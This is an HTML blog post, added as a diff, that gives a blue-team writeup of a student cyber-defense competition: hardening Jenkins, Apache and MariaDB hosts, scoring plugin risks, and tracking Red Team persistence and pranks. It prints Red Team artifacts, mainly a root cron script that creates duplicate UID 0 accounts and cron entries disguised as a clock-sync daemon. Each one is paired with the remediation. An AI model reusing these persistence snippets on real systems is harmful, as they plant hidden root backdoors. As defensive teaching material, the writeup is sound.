@@ -1,0 +1,662 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <link rel="icon" type="image/svg+xml" href="../../icon/favicon.svg" />
+    <link rel="icon" type="image/png" sizes="32x32" href="../../icon/favicon-32.png" />
+    <link rel="apple-touch-icon" href="../../icon/apple-touch-icon.png" />
+
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="theme-color" content="#0A0E14" />
+    <meta name="description" content="Blue-team writeup from Horse Plinko Cyber Challenge 4: defending a five-box Windows and Linux network against a live Red Team." />
+    <title>Horse Plinko Cyber Challenge 4</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@500;600;700&family=Inter:wght@400;500;600&display=swap"
+      rel="stylesheet"
+    />
+    <link
+      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css"
+      rel="stylesheet"
+    />
+    <link href="../../assets/style/style.css" rel="stylesheet" />
+
+    <!--
+      Dark-theme override, same tokens as index.html and blog.html, so
+      this post reads as the same site instead of a light-page holdover.
+      The pre / h4 / fig rules below are additions for this writeup's
+      code blocks, subsections and screenshot captions; everything else
+      inherits from the shared stylesheet.
+    -->
+    <style>
+      :root {
+        --bg: #0A0E14;
+        --surface: #171D2B;
+        --ink: #E7EAF0;
+        --muted: #8891A3;
+        --line: #232B3D;
+        --accent: #8B7CF6;
+        --accent-soft: rgba(139, 124, 246, 0.09);
+        --accent-2: #2DD4BF;
+        --accent-2-soft: rgba(45, 212, 191, 0.14);
+        --accent-3: #F5A34B;
+        --accent-3-soft: rgba(245, 163, 75, 0.07);
+      }
+      .post-body h4 {
+        font-family: var(--font-display);
+        font-weight: 600;
+        font-size: 0.95rem;
+        margin: 1.6rem 0 0.6rem;
+        color: var(--accent-2);
+      }
+      .post-body pre {
+        background: var(--surface);
+        border: 1px solid var(--line);
+        border-radius: 8px;
+        padding: 0.85rem 1rem;
+        overflow-x: auto;
+        margin: 0 0 1.4rem;
+        font-size: 0.8rem;
+        line-height: 1.5;
+      }
+      .post-body pre code {
+        background: none;
+        color: var(--ink);
+        padding: 0;
+        font-size: inherit;
+        white-space: pre;
+      }
+      .post-body img {
+        box-shadow: 0 0 0 1px var(--line);
+        cursor: zoom-in;
+      }
+      .fig-cap {
+        font-size: 0.85rem;
+        color: var(--muted);
+        margin-top: -0.6rem;
+      }
+      .withheld {
+        font-size: 0.9rem;
+        color: var(--muted);
+        border-left: 3px solid var(--line);
+        padding-left: 0.9rem;
+        margin-bottom: 1.1rem;
+      }
+    </style>
+  </head>
+  <body>
+    <main class="page">
+
+      <a class="back-link" href="../../blog.html"><i class="fa-solid fa-arrow-left"></i> Back to blog</a>
+
+      <div class="post-tags">
+        <span class="tag tag-forensics">Competition</span>
+        <span class="tag tag-network">Blue team</span>
+      </div>
+      <h1 class="name" style="font-size: 1.8rem; text-align: left; animation: none; opacity: 1; transform: none;">
+        Horse Plinko Cyber Challenge 4
+      </h1>
+      <p class="post-date">Team 26 Blue Team, hosted at UCF, October 17, 2026</p>
+
+      <div class="post-body">
+
+        <h3>Overview</h3>
+        <p>
+          I was on Team 26 at the Horse Plinko Cyber Challenge 4 (HPCC4), a beginner blue-team
+          competition hosted at UCF on October 17, 2026. Four of us defended a five-box Windows
+          and Linux network against a live Red Team while completing business injects. Service
+          uptime counted for 70% of the score and injects for 30%.
+        </p>
+        <p>
+          I worked on three of our five boxes alongside teammates: assembly (Windows Server 2022,
+          Jenkins and RDP), guidance (Ubuntu, the PlinkCom web app and SSH) and manifest
+          (Windows Server 2019, MariaDB and RDP). None of them was mine alone, but on each the job
+          was the same: keep the services scoring while closing off the ways Red Team could get in.
+          I also worked on four injects.
+        </p>
+        <p>
+          If you're reading top to bottom and aren't deep in this world: the whole game is keeping
+          a handful of services online while a Red Team tries to knock them over. They do it two
+          ways. The serious way is breaking things quietly, like stopping a service or hiding a
+          backdoor account. The other way is just messing with you, like swapping your terminal
+          output for a cartoon horse or making you win a dice roll before a command will run. Both
+          are in here. The screenshots show the real ones, and the jokes are collected under Red
+          Team pranks.
+        </p>
+
+        <h3>Environment</h3>
+        <p>
+          The competition ran from 10:00 to 17:30. Service uptime was 70% of the score and injects
+          30%. Each team had five free reverts; after that, every revert cost 20 minutes of uptime,
+          so the goal was to fix a box in place rather than roll it back. Every scored service is
+          checked as the jmoney account, whose password is registered in the scoreboard (NEIGH) as
+          well as on each box. jmoney can never be disabled, and its password has to stay in sync
+          everywhere, which is the thread behind several of the Red Team moves below.
+        </p>
+
+        <table>
+          <thead><tr><th>Item</th><th>Detail</th></tr></thead>
+          <tbody>
+            <tr><td>Box</td><td>assembly, 172.16.26.30</td></tr>
+            <tr><td>OS</td><td>Windows Server 2022</td></tr>
+            <tr><td>Scored: RDP</td><td>jmoney must log in over RDP (TCP 3389)</td></tr>
+            <tr><td>Scored: Jenkins</td><td>jmoney must log in at port 8080 and see the latest rocket-build succeed</td></tr>
+            <tr><td>Access</td><td>RDP from Kali over the NetBird VPN, Jenkins UI in the browser</td></tr>
+            <tr><td>Backup target</td><td>blackbox (172.16.26.5), out of scope for Red Team</td></tr>
+            <tr><td>Team network</td><td>Team 26, 172.16.26.0/24: blackbox .5 (Linux Mint 22, out of scope), guidance .10 (Ubuntu 22.04), ignition .20 (Fedora Server 38), assembly .30 (Windows Server 2022), manifest .40 (Windows Server 2019)</td></tr>
+            <tr><td>Scored services, whole team</td><td>guidance: SSH and PlinkCom web. ignition: SSH and Open WebUI. assembly: RDP and Jenkins. manifest: RDP and MariaDB. Every check logs in as jmoney</td></tr>
+          </tbody>
+        </table>
+
+        <p>
+          Jenkins ran builds on its built-in node, so any job change ran code directly on assembly
+          as the Jenkins service account. That made the job config and the Script Console the
+          highest-value targets on the box.
+        </p>
+
+        <h3>Prep</h3>
+        <p>
+          The day before, I stood up a local Jenkins 2.580.1 instance in WSL Kali to learn the admin
+          UI before touching the real box.
+        </p>
+        <ul>
+          <li>Walked through Manage Jenkins to find the pages that matter for defense: Security, Users, Credentials, Plugins, System Information and the Script Console</li>
+          <li>Ran a harmless command in the Script Console to see how much access an admin login gives</li>
+          <li>Built a command cheat sheet for assembly: user audits, Jenkins service and file paths, persistence hunting, firewall rollback</li>
+          <li>Planned key-only SSH into assembly from Kali (ed25519 key, password and keyboard-interactive auth off, AllowUsers plinktern)</li>
+          <li>Reviewed my own CCDC-Script toolkit and worked out the right firewall inputs for this box</li>
+        </ul>
+        <img src="photos/prep.png" alt="Local Jenkins instance used for prep" />
+        <p class="fig-cap">Local Jenkins 2.580.1 instance in WSL Kali, used to learn the admin UI before the round.</p>
+
+        <h3>Assembly (Jenkins)</h3>
+        <p>
+          The plan was to lock credentials first, keep a clean backup, then harden without breaking
+          either scored service. Cut any step below I didn't get to.
+        </p>
+        <ol>
+          <li><strong>Credentials.</strong> Changed plinktern's and jmoney's passwords in Windows and separately in Jenkins, since the defaults were in the public packet. Updated jmoney's new password in the scoreboard so checks kept passing.</li>
+          <li><strong>Backups to blackbox.</strong> Zipped the Jenkins home (config, jobs, users, credentials, secrets), the service config, a firewall export and the local user and admin lists, then copied them to blackbox with scp.</li>
+          <li><strong>Firewall.</strong> Ran my firewall baseline script: inbound default block, logging on, TCP 8080 allowed, RDP left open so the scoring engine could reach it from any range.</li>
+          <li><strong>Verified scoring.</strong> Checked that RDP and Jenkins stayed green after each change.</li>
+          <li><strong>Windows hunting.</strong> Reviewed local users and admins, non-Microsoft scheduled tasks, services, Run keys, listening ports and pre-existing inbound allow rules.</li>
+          <li><strong>Jenkins lockdown.</strong> Audited Jenkins users, confirmed no anonymous access or sign-up, reviewed the rocket-build job's build steps, stored credentials, plugins and the version.</li>
+          <li><strong>Monitoring.</strong> Re-ran triage and watched OpenObserve on blackbox for logons and service changes.</li>
+        </ol>
+        <p>
+          Scoring evidence: Figures 1 and 5 show the scoreboard, and the post-flight checks under
+          Injects show Apache, Open WebUI and the Jenkins sign-in running.
+        </p>
+
+        <h4>Plugin updates</h4>
+        <p>
+          Manage Jenkins flagged three installed plugins: Gradle (SSRF that can capture the Develocity
+          access key), Pipeline: Multibranch (exposure of System-scoped credentials) and Pipeline:
+          Groovy Libraries (path traversal). It also offered Jenkins 2.580.1. I updated Jenkins and the
+          flagged plugins (Figure 4). I also scored the plugin findings for the vulnerability disclosure
+          inject, below.
+        </p>
+
+        <h4>Plugin risk scoring</h4>
+        <p>
+          I scored the three Manage Jenkins plugin warnings with MITRE ATT&amp;CK and CVSS 3.1 and
+          ranked them. These numbers are my own calculations from the warning text, not the official
+          Jenkins advisories, so check them before quoting them as final.
+        </p>
+        <table>
+          <thead><tr><th>Rank</th><th>Component</th><th>CVSS 3.1 vector</th><th>Score</th><th>Why</th></tr></thead>
+          <tbody>
+            <tr><td>1</td><td>Pipeline: Multibranch (exposure of System-scoped credentials)</td><td>AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N</td><td>7.7</td><td>Stolen credentials can be reused against the repo, cloud or agents</td></tr>
+            <tr><td>2</td><td>Pipeline: Groovy Libraries (path traversal)</td><td>AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N</td><td>6.5</td><td>File read on the controller, which can include secrets</td></tr>
+            <tr><td>3</td><td>Gradle Plugin (SSRF)</td><td>AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N</td><td>6.5</td><td>Leaks only the Develocity access key</td></tr>
+          </tbody>
+        </table>
+        <p>
+          With scope unchanged the Multibranch issue scores 6.5. I used 7.7 because the credential opens
+          a different security authority. If anonymous users could create jobs, PR drops to N and the
+          scores rise to 7.5 and 8.6, which is why I confirmed there was no anonymous access.
+        </p>
+        <p>
+          ATT&amp;CK path for the top finding: T1078 Valid Accounts for the low-privilege foothold, T1059
+          Command and Scripting Interpreter through a pipeline job, T1555 and T1552 for credential access,
+          then T1550 Use Alternate Authentication Material to reuse the secret. Mitigations: M1032
+          Multi-factor Authentication, M1026 Privileged Account Management, plus updating the plugin and
+          rotating every System-scoped credential.
+        </p>
+        <p>
+          Team matrix entry: Impact High, Likelihood Medium, Overall Risk High, CVSS 6.5 (7.7 if scope
+          changes), ATT&amp;CK T1078 Valid Accounts, mitigation M1032, affected host 172.16.26.30.
+        </p>
+
+        <h4>Red Team on assembly</h4>
+        <p>
+          <strong>Scoring sign-in failure (11:15).</strong> The scoreboard showed the Jenkins check down
+          with "Jenkins rejected the scoring account's sign-in" and a redirect to /loginError, while RDP
+          stayed up (Figure 1).
+        </p>
+        <p>
+          <strong>Lookalike account (11:18).</strong> The Jenkins user list had jomoney next to the scored
+          jmoney, one letter off. It was a fake account planted by Red Team, so I deleted it (Figure 2).
+        </p>
+        <p>
+          <strong>Admin account tampering.</strong> At some point Red Team edited plinktern's own Jenkins
+          account, setting its description to "hi red guys" (Figure 19). Editing an admin profile means they
+          had Jenkins admin access on assembly, not just a foothold. That lines up with the service tampering
+          and the planted jomoney account: all three point to admin-level access, not a single stray login.
+        </p>
+        <p>
+          <strong>Service tampering (15:20).</strong> The Jenkins service was Stopped and would not come back.
+          Get-CimInstance Win32_Service showed why: its launch command had been changed to
+          <code>"C:\Program Files\Jenkins\jenkins.exe" BUT EVIL</code>. Windows passes the extra words to
+          jenkins.exe as arguments, so the service fails to start and the scored Jenkins check goes down
+          (T1112 Modify Registry, T1489 Service Stop). It was the same trick Red Team used on manifest's
+          MariaDB service. I set the ImagePath back to the bare executable and started the service, and
+          Get-Service showed it Running (Figure 3):
+        </p>
+        <pre><code>Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\Jenkins" -Name ImagePath -Value '"C:\Program Files\Jenkins\jenkins.exe"'
+Start-Service Jenkins
+Get-Service Jenkins</code></pre>
+        <p>
+          <strong>Password reset.</strong> I tried to reset plinktern's Jenkins password by stopping the service
+          and replacing the passwordHash in the user's config.xml. One run found no config.xml, and a run from a
+          PowerShell ISE that was not elevated could not open the service. I also pasted Groovy Script Console code
+          into PowerShell by mistake, which failed to parse. We finally reset the credentials through the Jenkins
+          Script Console.
+        </p>
+
+        <h4>Assembly injects</h4>
+        <ul>
+          <li><strong>Vulnerability disclosure #467337.</strong> The Multibranch finding scored above, filed on the compliance form. The full form and my notes on it are under Injects.</li>
+          <li><strong>Post-flight check 3.</strong> Our screenshot of the Jenkins sign-in on localhost:8080 as plinktern came from this box.</li>
+        </ul>
+
+        <h3>Guidance (PlinkCom web)</h3>
+        <p>
+          Guidance is the Ubuntu 22.04 box at 172.16.26.10. It runs the PlinkCom PHP app on Apache and SSH,
+          and the scoring engine checks both as jmoney.
+        </p>
+
+        <h4>Apache review</h4>
+        <p>
+          I checked ports.conf, apache2.conf, envvars and the loaded modules against Debian defaults, and all of
+          them matched (Figure 14). Port 80 was the only listener and nothing ran TLS (Figure 15). I left it that
+          way because the scoring checks use plain HTTP, and logged it as an accepted risk. Our post-flight checks
+          inject used this box's apache2 status, active (running) since 07:15:05 UTC.
+        </p>
+
+        <h4>Uploads webshell path (15:55)</h4>
+        <p>
+          The vhost in sites-available/plinkcom.conf let PHP run inside public/uploads. A comment in the block said
+          so outright: "INTENTIONAL: mod_php executes uploaded PHP files here." Anyone who could upload a .php file
+          there could run commands on the box as www-data (T1505.003 Web Shell). AllowOverride AuthConfig also let a
+          dropped .htaccess change how the folder behaved.
+        </p>
+        <p>
+          I replaced the block so PHP is off in that folder, overrides are ignored and only .txt files are served
+          (Figures 17 and 18):
+        </p>
+        <pre><code>&lt;Directory /var/www/plinkcom/public/uploads&gt;
+    Options -Indexes -ExecCGI -FollowSymLinks
+    AllowOverride None
+    Require all granted
+    php_admin_flag engine off
+    &lt;FilesMatch "(?i)^(?!.*[.]txt$).*$"&gt;
+        Require all denied
+    &lt;/FilesMatch&gt;
+    &lt;FilesMatch "(?i)[.]txt$"&gt;
+        SetHandler default-handler
+    &lt;/FilesMatch&gt;
+&lt;/Directory&gt;</code></pre>
+        <p>
+          I also changed the dotfile rule from <code>^\.</code> to <code>^[.]</code> so it matches the way it reads,
+          and removed a stray closing Directory tag that would have failed configtest.
+        </p>
+
+        <h4>Root cron backdoor (14:27)</h4>
+        <p>The auth log showed root's cron running a hidden script every minute:</p>
+        <pre><code>CRON[1112]: (root) CMD (/usr/local/bin/.sysmaint.sh)</code></pre>
+        <p>
+          /usr/local/bin held six hidden files from October 17: .sysmaint.sh, .ardiand.sh, .ejmguard.sh, .jsmguard.sh,
+          .sysguard.sh and .kernguard.py (Figure 16). .sysmaint.sh creates four accounts with a duplicate root UID,
+          each with its own name as the password:
+        </p>
+        <pre><code>for u in ardian ardianwashere jamesmoney eviljamesmoney; do
+  if ! id -u $u &gt;/dev/null 2&gt;&amp;1; then
+    useradd -o -u 0 -g 0 -s /bin/bash $u
+    echo $u:$u | chpasswd
+  fi
+done</code></pre>
+        <p>
+          The -o flag allows the duplicate UID 0, so each account is a second root login. .ejmguard.sh backs it up with
+          a loop that recreates eviljamesmoney every 300 seconds, so deleting the accounts alone would not stick
+          (T1136.001 Create Account, T1053.003 Cron, T1564.001 Hidden Files).
+        </p>
+        <p>
+          I saved copies as evidence, killed the watchdog processes, removed the cron entry, deleted the scripts and
+          removed the fake accounts. Order mattered: the loops had to die before the accounts went, or they would come
+          right back.
+        </p>
+        <p>
+          Later, at 15:02, more persistence turned up: /etc/cron.d/rtc-syncd running /usr/local/sbin/mount-utabd-sync as
+          root at boot and every 6 minutes, a second odd cron file (systemd-tmpfiles), and about a dozen lookalike
+          services such as ardianwashere, systemdd, sshcrond and kernelguard. File dates (October 17 against the October
+          12 image) separated them from the real ones.
+        </p>
+        <p>The 15:02 cron file was dressed up as a clock-sync daemon:</p>
+        <pre><code># Realtime Clock Sync Daemon
+@reboot root /bin/sh -c 'sleep 60; /usr/local/sbin/mount-utabd-sync' &gt;/dev/null 2&gt;&amp;1
+*/6 * * * * root /usr/local/sbin/mount-utabd-sync &gt;/dev/null 2&gt;&amp;1</code></pre>
+        <p>
+          Despite the "Realtime Clock Sync" name, it runs /usr/local/sbin/mount-utabd-sync as root at boot and every 6
+          minutes (T1053.003 Cron, T1036 Masquerading). The enabled-services list had a matching set of lookalikes mixed
+          in with the real daemons: ardianwashere, systemdd, systemd-daemon, sshcrond, sshd-session-cache, sshd-socket,
+          kernelguard, hugepages-compactd, inetd, iscsid_safe, journald-upload-sync, and several dbus-broker and
+          apache2-rotate names (T1543.002 Systemd Service). One signature tied it together: ardianwashere shows up both
+          here as a planted service and above as one of the UID 0 accounts .sysmaint.sh creates, so the same actor left
+          the same name on two different persistence mechanisms. The real units that had to stay (ssh, apache2, cron,
+          otelcol-contrib for log shipping to blackbox, snapd, cloud-init) were told apart from the fakes by install date,
+          October 17 against the October 12 base image.
+        </p>
+
+        <h4>SSH check blocked (14:27)</h4>
+        <p>
+          The same auth log showed sshd refusing jmoney: "User jmoney not allowed because listed in DenyUsers". The
+          scoring engine logs into SSH as jmoney, so a DenyUsers entry for that name fails the check. I removed the jmoney
+          DenyUsers entry from sshd_config and reloaded ssh (sshd -t first) so the scored SSH login could authenticate
+          again. The entry singled out the scoring account, so it reads as Red Team's rather than a stock setting.
+        </p>
+
+        <h4>Shell tricks</h4>
+        <p>
+          Red Team also went after the terminal itself. A hook printed "the horse says: no" after every failed command,
+          and passwd failed with an authentication token error even though the passwd binary checked out clean (Figure 12).
+          A message appeared in the terminal threatening to delete the box (Figure 13), which we did not engage with. Later,
+          ls was hijacked into a roulette game (Figure 28).
+        </p>
+
+        <h4>Login page 404 (16:50)</h4>
+        <p>
+          The scored web check failed because /login.php returned Apache's 404. The file was still in
+          /var/www/plinkcom/public, but plinkcom-error.log showed Apache looking in /var/www/html, and /etc/apache2 had
+          changed about two minutes earlier. Around 15:37, javascript-common.conf had also been enabled in conf-enabled, the
+          only entry there newer than the October 12 image.
+        </p>
+
+        <h3>Manifest (MariaDB)</h3>
+        <p>
+          Manifest is the Windows Server 2019 box at 172.16.26.40. It runs MariaDB and RDP, and the scoring engine checks
+          both as jmoney. The plinkcom database here backs the PlinkCom app on guidance.
+        </p>
+
+        <h4>Backups</h4>
+        <p>
+          I dumped the plinkcom database with mariadb-dump (single transaction, routines and triggers) and copied it to
+          blackbox, so a revert or tampering could not take the only copy. It took a few tries. The first attempts left a
+          0 KB file (Figure 7), and at 14:07 the C:\backup folder I had made was gone, so the dump failed with "No such
+          file or directory" (Figure 6). I recreated the folder, reran the dump and checked the size and header before
+          trusting it. The good dump was 23 KB, stored on blackbox under ~/bk/manifest/backup (Figure 11).
+        </p>
+
+        <h4>Service tampering (15:08)</h4>
+        <p>
+          MariaDB stopped and would not start (Figure 8). PowerShell's error only said the service could not be started, so
+          I went to the MariaDB error log, which said "Too many arguments (first extra is 'MariaDB')". Get-CimInstance
+          Win32_Service showed the cause: Red Team had appended "BUT EVIL" to the service's launch command, so mysqld
+          received arguments it did not understand and quit (T1112 Modify Registry, T1489 Service Stop). This was the same
+          trick they used on Jenkins on assembly.
+        </p>
+        <p>I rewrote the service's ImagePath in the registry back to the clean command and restarted the service. The clean PathName is:</p>
+        <pre><code>"C:\Program Files\MariaDB 13.1\bin\mysqld.exe" "--defaults-file=C:\Program Files\MariaDB 13.1\data\my.ini" MariaDB</code></pre>
+        <p>Afterward the service showed Running, and mysqld was listening on 3306 (Figure 9).</p>
+
+        <h4>Restore</h4>
+        <p>
+          I dropped plinkcom before the backup file had reached the DB host, so the database sat empty until the file arrived.
+          Once it did, the restore brought MariaDB's data and service back.
+        </p>
+
+        <h3>Red Team activity</h3>
+        <p>Red Team had already left persistence on the boxes before the round. Times are Eastern on October 17.</p>
+        <table>
+          <thead><tr><th>Time</th><th>What I found</th><th>How I found it</th><th>What I did</th></tr></thead>
+          <tbody>
+            <tr><td>11:15</td><td>assembly: the Jenkins check went DOWN while RDP stayed UP</td><td>The scoreboard said Jenkins rejected the scoring account's sign-in and redirected to /loginError</td><td>See Figure 1.</td></tr>
+            <tr><td>11:18</td><td>assembly: a Jenkins user named jomoney, one letter off from the scored account jmoney</td><td>The Jenkins user list showed jmoney, jomoney and plinktern. Only jmoney is the scored account</td><td>Deleted it as a fake account planted by Red Team.</td></tr>
+            <tr><td>14:07</td><td>manifest: the C:\backup folder I had created was gone</td><td>mariadb-dump failed with "No such file or directory" on a folder that existed earlier</td><td>Recreated the folder and reran the dump.</td></tr>
+            <tr><td>14:27</td><td>guidance: root cron ran the hidden script /usr/local/bin/.sysmaint.sh every minute, backed by hidden watchdog scripts</td><td>The auth log showed CRON running the dotfile. ls -la /usr/local/bin listed the hidden scripts, and cat showed .sysmaint.sh creating UID 0 accounts</td><td>Saved copies as evidence, then killed the watchdogs before removing the cron entry, scripts and fake accounts.</td></tr>
+            <tr><td>14:27</td><td>guidance: sshd refused the scored jmoney account because it was listed in DenyUsers, so the SSH check could not log in</td><td>The auth log showed "User jmoney not allowed because listed in DenyUsers" from many source addresses</td><td>Removed the jmoney DenyUsers entry from sshd_config and reloaded ssh (sshd -t first).</td></tr>
+            <tr><td>14:28</td><td>guidance: a shell hook printed "the horse says: no" after every failed command, and passwd failed with an authentication token error</td><td>type -a, file, ls -l and dpkg -V on passwd were clean, and lsattr showed no immutable flags, so the binary was not the cause</td><td>Confirmed the passwd binary was clean, so the cause was a shell hook, not a replaced binary. Removed a suspicious item found under a programd path.</td></tr>
+            <tr><td>14:33</td><td>guidance: a message written into the terminal threatening to delete my box</td><td>Appeared in the shell output</td><td>Did not engage.</td></tr>
+            <tr><td>15:02</td><td>guidance: /etc/cron.d/rtc-syncd running as root every 6 minutes, a second odd cron file, and about a dozen lookalike services</td><td>Listed /etc/cron.* and systemctl list-unit-files, then compared against stock Ubuntu and file dates (Oct 17 against the Oct 12 image)</td><td>Identified the planted cron files and lookalike units by install date; disabled the units, removed rtc-syncd and its payload, and daemon-reload.</td></tr>
+            <tr><td>15:08</td><td>manifest: MariaDB would not start, and the service launch command ended with extra text ("BUT EVIL")</td><td>The mysqld error log said "Too many arguments (first extra is 'MariaDB')", then Get-CimInstance Win32_Service showed the PathName</td><td>Rewrote the service ImagePath in the registry and restarted it; MariaDB came back and scored again.</td></tr>
+            <tr><td>15:20</td><td>assembly: the Jenkins service had the same appended text on its launch command</td><td>Same PathName check</td><td>Rewrote the Jenkins service ImagePath with Set-ItemProperty and started the service; Get-Service showed it Running.</td></tr>
+            <tr><td>15:55</td><td>guidance: the Apache vhost let mod_php run any file uploaded to public/uploads, a webshell path</td><td>Read sites-available/plinkcom.conf. A comment in the uploads block said PHP execution there was intentional</td><td>Set AllowOverride None, php_admin_flag engine off, and FilesMatch rules that deny everything except .txt. Also fixed a stray closing Directory tag.</td></tr>
+            <tr><td>16:50</td><td>guidance: the scoring check failed because /login.php returned Apache's 404</td><td>login.php existed under /var/www/plinkcom/public, but plinkcom-error.log said Apache looked for /var/www/html/login.php, and /etc/apache2 had changed two minutes earlier</td><td>Diagnosed as the running Apache serving from /var/www/html instead of the vhost DocumentRoot. Fix: correct the config and do a full restart, not a reload.</td></tr>
+          </tbody>
+        </table>
+
+        <h3>Red Team playbook</h3>
+        <p>A few patterns repeated across the boxes, which made later findings quicker to spot once the first one turned up.</p>
+        <ul>
+          <li><strong>Service sabotage by appended arguments.</strong> The Jenkins service on assembly and the MariaDB service on manifest had the exact same tamper: extra words bolted onto the end of the service launch command so the real binary rejects its arguments and the service dies (T1112, T1489). After seeing it on one Windows box, the other was a one-command registry fix.</li>
+          <li><strong>The scoring account was the target, not collateral.</strong> jmoney was blocked at SSH on guidance (a DenyUsers entry) and shadowed by a jomoney lookalike in Jenkins. Both aimed at the one account every scored check uses.</li>
+          <li><strong>A consistent naming signature.</strong> ardianwashere appears as a UID 0 account and as a planted systemd service, and the fake services deliberately echo real daemon names. That signature is what separated the planted persistence from the stock image.</li>
+          <li><strong>Shell-level harassment reused across hosts.</strong> The "the horse says: no" hook and the dice and roulette gags showed up on both guidance and ignition, so they came from shared tooling rather than per-box effort.</li>
+        </ul>
+
+        <h3>ATT&amp;CK summary</h3>
+        <table>
+          <thead><tr><th>Technique</th><th>Where it showed up</th></tr></thead>
+          <tbody>
+            <tr><td>T1078 Valid Accounts</td><td>jmoney scoring account targeted; admin-level Jenkins access on assembly</td></tr>
+            <tr><td>T1136.001 Create Account: Local</td><td>UID 0 accounts created by .sysmaint.sh (guidance)</td></tr>
+            <tr><td>T1053.003 Scheduled Task/Job: Cron</td><td>.sysmaint.sh every minute, rtc-syncd every 6 minutes (guidance)</td></tr>
+            <tr><td>T1543.002 Create or Modify System Process: Systemd</td><td>lookalike services; systemd-proc on ignition (guidance, ignition)</td></tr>
+            <tr><td>T1564.001 Hidden Files and Directories</td><td>dotfile scripts in /usr/local/bin (guidance)</td></tr>
+            <tr><td>T1112 Modify Registry</td><td>service ImagePath tampering (assembly, manifest)</td></tr>
+            <tr><td>T1489 Service Stop</td><td>Jenkins and MariaDB stopped (assembly, manifest)</td></tr>
+            <tr><td>T1505.003 Web Shell</td><td>PHP execution allowed in public/uploads (guidance)</td></tr>
+            <tr><td>T1036 Masquerading</td><td>MicrosoftEdgeUpdate.ps1, rtc-syncd, lookalike service names</td></tr>
+            <tr><td>T1027 / T1140 Obfuscated Files / Deobfuscate</td><td>base64 + XOR payload in the fake Edge update</td></tr>
+          </tbody>
+        </table>
+
+        <h3>Red Team pranks</h3>
+        <p>Red Team also left a few jokes on the boxes.</p>
+        <p>
+          <strong>Figure 24.</strong> A "Helpful Horse" popup that appeared on the Windows machines, shown here over
+          PlinkCom's User Management page at 18:04:08 UTC. A cartoon horse sits on top of the window, and a fake dialog asks
+          to "access photos, media, and files on your device". The page lists 10 accounts: jmoney, hkeating, joe, thescreamer,
+          plinktern, aurorag, np, kevink, ibiza and maurice. Only jmoney and plinktern show a login that day.
+        </p>
+        <img src="photos/fig24.png" alt="Figure 24: Helpful Horse popup over PlinkCom User Management" />
+        <p>
+          <strong>Figure 25.</strong> plinktern's home folder on ignition at 15:34:58. A horse emoji replaces random characters
+          on screen, so the same file shows as .bash_eternal_h&#127942;story in one listing and .bash_eternal_history in the
+          next, and the typed ls shows as l&#127942;. The folder also holds .bash_eternal_history, .bash_history.tmp and an empty
+          .wall-e file.
+        </p>
+        <img src="photos/fig25.png" alt="Figure 25: horse emoji replacing characters in a home folder listing" />
+        <p>
+          <strong>Figure 26.</strong> A full-screen "YOU MUST ROLL A 6 TO CONTINUE" dice game, here showing "You rolled a 2. Not
+          a 6 -- roll again." It popped up on both the Windows and Linux machines. On Windows, ending it in Task Manager closed it.
+        </p>
+        <img src="photos/fig26.png" alt="Figure 26: YOU MUST ROLL A 6 TO CONTINUE dice game" />
+        <p>
+          <strong>Figure 27.</strong> su to jmoney on ignition (Fedora 38). Login prints a failed unit named systemd-proc.service,
+          which is not a stock Fedora unit, and every line of output after that comes out rainbow-colored. jmoney's home folder has
+          the same .bash_eternal_history and .bash_history.tmp files as plinktern's, and the "the horse says: no" hook from guidance
+          shows up here too, so Red Team reused it across boxes.
+        </p>
+        <img src="photos/fig27.png" alt="Figure 27: rainbow-colored output and a fake systemd-proc unit on ignition" />
+        <p>
+          <strong>Figure 28.</strong> SSH back into guidance at 17:31:11 UTC after the connection timed out. A roulette wheel
+          replaces part of the login banner, and running ls starts a game asking "Choose your color - (r)ed, (b)lack, (g)reen"
+          instead of listing files, so ls itself was hijacked.
+        </p>
+        <img src="photos/fig28.png" alt="Figure 28: ls hijacked into a roulette game on guidance" />
+
+        <h3>Injects</h3>
+        <p>I worked on four of Team 26's injects alongside the box work. Each response went out from the IT-Team.</p>
+
+        <h4>Suspicious download</h4>
+        <p>The task was to look into a file found on a workstation.</p>
+        <p>
+          <strong>What we found.</strong> The Downloads folder held MicrosoftEdgeUpdate.ps1 (6 KB, dated 7/5/2026) among ordinary
+          office files like a snack drone incident report and a phone list. Edge does not update through a loose PowerShell script
+          in Downloads, so the name is a disguise (T1036 Masquerading).
+        </p>
+        <img src="photos/downloads-edgeupdate.png" alt="Downloads folder with MicrosoftEdgeUpdate.ps1" />
+        <p>
+          <strong>The timer.</strong> Opened in Notepad, the script builds a System.Windows.Forms.Timer with a 900 ms interval. Each
+          tick runs the next entry in a $steps list, so the script works in stages instead of all at once.
+        </p>
+        <img src="photos/timer-code.png" alt="Timer code in the fake Edge update script" />
+        <p>
+          <strong>The encoded payload.</strong> A long string, $ServicingManifest, is passed to a function named
+          Unprotect-ServicingManifest. Decoding it as plain base64 gave unreadable output. The function shows why: after the base64
+          step it XORs every byte against the ASCII bytes of a $ProductId value, repeating that key across the data (T1027 Obfuscated
+          Files or Information, T1140 Deobfuscate/Decode).
+        </p>
+        <img src="photos/unprotect-func.png" alt="Unprotect-ServicingManifest function" />
+        <p><strong>Open item.</strong> The script also references a proxy server, which we could not locate.</p>
+        <p>
+          <strong>Next time.</strong> Find where $ProductId is set, then run only the base64 and XOR steps offline to recover the
+          payload, without executing the rest of the script. That would likely reveal the proxy address too.
+        </p>
+
+        <h4>Post-flight checks</h4>
+        <p>Ibiza asked for five screenshots, in order, showing our post-flight checks. We sent three.</p>
+        <p><strong>1. Apache web server running (guidance).</strong> apache2.service is active (running) since 07:15:05 UTC.</p>
+        <img src="photos/apache2-status.png" alt="apache2 status, active and running" />
+        <p>
+          <strong>2. Open WebUI running (ignition).</strong> openwebui.service is active (running) on port 80, and the log shows
+          jmoney@plinko.horse authenticating at 14:57:31.
+        </p>
+        <img src="photos/openwebui-status.png" alt="openwebui status, active and running" />
+        <p><strong>3. Jenkins sign-in complete (assembly).</strong> The plinktern profile page on localhost:8080 after signing in.</p>
+        <img src="photos/jenkins-profile.png" alt="Jenkins profile after sign-in" />
